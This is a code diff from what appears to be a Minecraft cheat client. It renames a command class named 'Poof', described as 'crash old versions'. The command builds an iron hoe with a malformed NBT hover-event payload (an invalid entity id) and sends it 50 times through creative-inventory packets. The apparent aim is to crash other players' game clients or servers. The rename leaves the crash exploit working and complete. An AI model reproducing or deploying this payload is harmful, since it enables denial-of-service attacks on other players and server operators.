@@ -15,8 +15,8 @@ import net.shadow.client.feature.command.Command;
 
 import java.util.Objects;
 
-public class PoofCmd extends Command {
-    public PoofCmd() {
+public class Poof extends Command {
+    public Poof() {
         super("Poof", "crash old versions", "poof");
     }
 
@@ -34,14 +34,14 @@ public class PoofCmd extends Command {
 
     @Override
     public void onExecute(String[] args) {
-        ItemStack CRASHME = new ItemStack(Items.IRON_HOE, 1);
+        ItemStack crashme = new ItemStack(Items.IRON_HOE, 1);
         try {
-            CRASHME.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"fuck\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"ez\",\"type\":\"minecraft:player\"}}}'}}"));
+            crashme.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"fuck\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"ez\",\"type\":\"minecraft:player\"}}}'}}"));
         } catch (CommandSyntaxException e) {
             e.printStackTrace();
         }
         for (int i = 0; i < 50; i++) {
-            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(9, CRASHME));
+            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(9, crashme));
             drop(9);
         }
     }
